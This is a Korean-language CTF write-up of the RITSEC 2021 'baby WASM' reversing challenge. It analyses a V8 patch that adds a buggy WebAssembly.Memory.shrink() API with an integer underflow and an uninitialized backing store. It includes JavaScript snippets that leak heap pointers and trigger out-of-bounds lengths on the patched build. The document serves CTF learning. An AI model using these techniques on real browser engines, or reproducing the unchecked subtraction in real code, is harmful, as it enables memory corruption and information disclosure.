---
title: "RITSEC 2021: baby WASM"
date: 2021-04-10
description: "RITSEC CTF 2021 baby WASM 풀이: WebAssembly 바이트코드 리버싱, WASM 메모리 모델 이해, 플래그 추출"
tags: ["RITSEC", "CTF", "WebAssembly", "WASM", "reversing", "browser"]
platform: "ctf"
category: "reversing"
difficulty: "easy-medium"
categories: ["CTF"]
authors:
  - name: "ph4nt0m"
    link: "https://github.com/Phantomn"
    image: "https://github.com/Phantomn.png"
---

## 1. 문제

첨부 파일 목록:

```bash
➜  Baby_WASM git:(main) ✗ ls
description.txt  download_d8.sh libc.so.6  v8.diff  v8.patch  v8.release  v8.release.tar.gz
```

diff 파일과 patch 파일이 있다. 이 두 개를 분석해야 어떤 취약점이 있는지 파악할 수 있다.

패치된 V8 빌드(`v8.release`)와 `libc.so.6`, 그리고 엔진에서 무엇이 변경됐는지 정확히 보여주는 diff가 제공된다. 패치로 도입된 취약점을 이해하고 익스플로잇하는 것이 과제다.

## 2. 패치 분석

diff는 V8의 WebAssembly 서브시스템을 수정해 `WebAssembly.Memory.shrink()` API를 추가한다. 기존의 `grow()` 호출을 미러링하지만 백킹 스토어를 늘리는 대신 줄인다. diff를 자세히 읽으면 치명적인 버그가 드러난다.

### 새 인터럽트 플래그

```diff
-  V(WASM_CODE_GC, WasmCodeGC, 7)
+  V(WASM_CODE_GC, WasmCodeGC, 7)                                  \
+  V(SHRINK_SHARED_MEMORY, ShrinkSharedMemory, 8)
```

기존 `GROW_SHARED_MEMORY`와 유사한 새 인터럽트 플래그 `SHRINK_SHARED_MEMORY`가 등록된다.

### 새 플래그 정의

```diff
+DEFINE_BOOL(wasm_shrink_shared_memory, true,
+            "allow shrinking shared WebAssembly memory objects")
```

공유 메모리 축소가 기본적으로 활성화된다.

### `ShrinkWasmMemoryInPlace`

```cpp
base::Optional<size_t> BackingStore::ShrinkWasmMemoryInPlace(
    Isolate* isolate, size_t delta_bytes) {

  size_t old_length = byte_length_.load(std::memory_order_relaxed);
  size_t new_length = 0;
  while (true) {
    new_length = old_length - delta_bytes;
    if (byte_length_.compare_exchange_weak(old_length, new_length,
                                           std::memory_order_acq_rel)) {
      break;
    }
  }
  ...
  return {old_length};
}
```

이 CAS 루프는 `byte_length_`를 `delta_bytes`만큼 원자적으로 감소시킨다. **경계 검사가 전혀 없다** — `delta_bytes > old_length`이면 `new_length`가 언더플로(unsigned underflow)되어 엄청나게 큰 값이 된다.

### `CopyWasmMemoryOnShrink`

```cpp
std::unique_ptr<BackingStore> BackingStore::CopyWasmMemoryOnShrink(
    Isolate* isolate, size_t new_size) {

  if (is_wasm_memory_) {
    BackingStore::ShrinkWasmMemoryInPlace(isolate, this->byte_length() - new_size);
    auto new_backing_store = BackingStore::Allocate(
        isolate, new_size, ..., InitializedFlag::kUninitialized);
    if (!new_backing_store) { return {}; }
    return new_backing_store;  // <-- new_size 크기의 새 스토어 할당
  } else {
    bool result = BackingStore::Reallocate(isolate, new_size);
    ...
  }
  return std::unique_ptr<BackingStore>(this);
}
```

비공유 WASM 메모리의 경우, `CopyWasmMemoryOnShrink`는 먼저 `ShrinkWasmMemoryInPlace`를 호출해 `byte_length_`를 업데이트한 후, `kUninitialized`로 표시된 `new_size` 크기의 **새** 백킹 스토어를 할당한다. 기존 데이터는 새 스토어에 복사되지 않는다.

### `WasmMemoryObject::Shrink` — 핵심 버그

```cpp
int32_t WasmMemoryObject::Shrink(Isolate* isolate,
                                  Handle<WasmMemoryObject> memory_object,
                                  uint32_t bytes) {
  Handle<JSArrayBuffer> old_buffer(memory_object->array_buffer(), isolate);
  ...
  size_t old_size = old_buffer->byte_length();

  // 비공유 경로:
  size_t new_size = old_size - bytes;
  std::unique_ptr<BackingStore> new_backing_store =
      backing_store->CopyWasmMemoryOnShrink(isolate, new_size);
  ...
  Handle<JSArrayBuffer> new_buffer =
      isolate->factory()->NewJSArrayBuffer(std::move(new_backing_store));

  memory_object->update_instances(isolate, new_buffer);

  return static_cast<int32_t>(old_size);  // 바이트 단위 반환 (페이지 아님!)
}
```

비공유 경로에서 두 가지 버그:

1. **`bytes`에 대한 하한 검사 없음**: `new_size = old_size - bytes`가 `bytes > old_size`이면 언더플로 발생
2. **초기화되지 않은 메모리 노출**: `CopyWasmMemoryOnShrink`가 `kUninitialized`로 새 백킹 스토어를 할당하므로, 결과 `ArrayBuffer`에 V8 프로세스의 임의 힙 데이터가 포함될 수 있음

추가로, `ArrayBuffer.detach()` 가드가 주석 처리됐다:

```diff
-    CHECK_IMPLIES(force_for_wasm_memory, backing_store->is_wasm_memory());
+    // CHECK_IMPLIES(force_for_wasm_memory, backing_store->is_wasm_memory());
```

이로 인해 비-WASM 배열 버퍼를 강제로 detach할 수 있게 되어 안전 어설션이 제거됐다.

## 3. 접근 방법

### 초기화되지 않은 힙 메모리 읽기

가장 직접적인 프리미티브:

1. 초기 크기로 WASM 메모리 할당 (예: 1페이지 = 64 KiB)
2. `memory.shrink(N)` 호출 (N < current_byte_length)
3. 반환된 `ArrayBuffer`(`memory.buffer`)가 **초기화되지 않은** `new_size` 바이트 영역을 가리킴

```javascript
const mem = new WebAssembly.Memory({ initial: 1 });  // 64 KiB
mem.shrink(0x1000);  // 4 KiB 축소 → 새 버퍼는 60 KiB, 초기화 안 됨

const view = new Uint8Array(mem.buffer);
// view에 raw 힙 바이트가 노출됨 — 잠재적 정보 누출
```

### 정수 언더플로로 경계 밖 접근

현재 크기보다 더 많이 축소하면:

```javascript
const mem = new WebAssembly.Memory({ initial: 1 });
// byte_length = 0x10000 (65536)
mem.shrink(0x10001);  // new_size가 ~2^64 - 1로 언더플로
```

`byte_length_`가 엄청 큰 값으로 래핑된다. 이후 버퍼를 통한 접근으로 원래 할당 범위 훨씬 밖의 메모리를 읽거나 쓸 수 있다.

### 익스플로잇 흐름

```javascript
// 1. WASM 메모리 생성
const mem = new WebAssembly.Memory({ initial: 4 });  // 4페이지 = 256 KiB

// 2. 알려진 패턴 작성으로 버퍼를 메모리에서 식별
const u32 = new Uint32Array(mem.buffer);
for (let i = 0; i < u32.length; i++) u32[i] = 0xdeadbeef;

// 3. shrink 트리거 — 새 버퍼가 초기화 안 됨, V8 힙 포인터 포함 가능
mem.shrink(0x1000);

// 4. 새 버퍼에서 흥미로운 값(포인터, 플래그) 스캔
const leak = new BigUint64Array(mem.buffer);
for (let i = 0; i < leak.length; i++) {
    const v = leak[i];
    if (v > 0x7f0000000000n && v < 0x7fffffffffffffn) {
        console.log(`[+] potential pointer at index ${i}: 0x${v.toString(16)}`);
    }
}
```

## 4. 핵심 개념

### WebAssembly 메모리 모델

WASM 선형 메모리는 **페이지** 단위(1페이지 = 64 KiB)로 측정되는 연속적인 `ArrayBuffer`다. `grow()` API는 이미 WASM 스펙의 일부이지만 `shrink()`는 표준에 존재하지 않는다 — 이 문제에만 있는 추가 기능이다.

### 공유 메모리 vs 비공유 메모리

- **공유 메모리** (`{ shared: true }`) — `SharedArrayBuffer`로 백킹, 워커 간 공유 가능. 제자리 축소(shrink-in-place)는 `byte_length_`를 원자적으로 업데이트하지만 재할당은 불가.
- **비공유 메모리** — 표준 `ArrayBuffer`. 패치에서 축소 시 초기화되지 않은 새 백킹 스토어를 할당하여 메모리 공개 취약점이 발생.

### `kUninitialized` 할당

`InitializedFlag::kUninitialized`는 백킹 스토어를 0으로 초기화하는 `memset`을 건너뛴다. 할당자가 이전에 다른 V8 객체에 사용된 영역을 반환할 수 있어 WASM 버퍼를 통해 raw 바이트가 노출된다.

## 5. 요약

baby WASM 문제는 합성된 `WebAssembly.Memory.shrink()` API에 두 가지 취약점을 도입했다:

- **하한 검사 없음**: byte-length CAS 루프에서 정수 언더플로 가능
- **초기화되지 않은 백킹 스토어**: 비공유 코드 경로에서 결과 `ArrayBuffer`를 통한 힙 메모리 공개

이 문제는 JavaScript 엔진의 커스텀 메모리 관리 확장에서 흔한 버그 유형을 보여준다: 경계 검사 누락과 새로 노출된 메모리 영역의 초기화 생략.
